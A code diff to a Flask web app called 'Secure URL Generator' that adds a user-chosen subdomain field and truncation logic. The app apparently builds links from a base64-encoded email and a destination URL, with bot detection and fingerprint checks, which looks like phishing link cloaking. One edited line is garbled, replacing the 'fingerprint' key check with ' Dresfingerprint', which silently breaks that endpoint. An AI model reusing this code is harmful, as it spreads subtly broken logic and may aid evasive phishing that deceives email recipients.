@@ -347,6 +347,10 @@ def index():
                     <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Secure URL Generator</h1>
                     <form method="POST" action="{{ url_for('generate') }}" class="space-y-5">
                         <div>
+                            <label class="block text-sm font-medium text-gray-700">Subdomain</label>
+                            <input type="text" name="subdomain" required maxlength="20" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                        </div>
+                        <div>
                             <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
                             <input type="text" name="randomstring1" required maxlength="20" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                         </div>
@@ -390,7 +394,7 @@ def challenge():
 def fingerprint():
     try:
         data = request.get_json()
-        if data and 'fingerprint' in data:
+        if data and ' Dresfingerprint' in data:
             fingerprint = generate_fingerprint()
             if redis_client:
                 redis_client.setex(f"fingerprint:{fingerprint}", 3600, data['fingerprint'])
@@ -411,6 +415,7 @@ def generate():
             logger.warning("Bot or unverified browser detected")
             abort(403, "Access denied")
 
+        subdomain = request.form.get("subdomain", "default")
         randomstring1 = request.form.get("randomstring1", "default")
         base64email = request.form.get("base64email", "default")
         destination_link = request.form.get("destination_link", "https://example.com")
@@ -420,6 +425,9 @@ def generate():
         if not re.match(r"^https?://", destination_link):
             logger.error(f"Invalid URL: {destination_link}")
             abort(400, "Invalid URL")
+        if len(subdomain) > 20:
+            subdomain = subdomain[:20]
+            logger.debug(f"Truncated Subdomain to 20 chars: {subdomain}")
         if len(randomstring1) > 20:
             randomstring1 = randomstring1[:20]
             logger.debug(f"Truncated Randomstring1 to 20 chars: {randomstring1}")
@@ -427,8 +435,8 @@ def generate():
             randomstring2 = randomstring2[:20]
             logger.debug(f"Truncated Randomstring2 to 20 chars: {randomstring2}")
 
-        # Use Randomstring1 as subdomain (case-sensitive, up to 20 chars)
-        subdomain = randomstring1 if randomstring1 else "default"
+        # Use Subdomain as entered (case-sensitive, up to 20 chars)
+        subdomain = subdomain if subdomain else "default"
         logger.debug(f"Using subdomain: {subdomain}")
         endpoint = generate_random_string(8)
         randomstring1_short = randomstring1[:6] if len(randomstring1) >= 6 else randomstring1 + generate_random_string(6 - len(randomstring1))
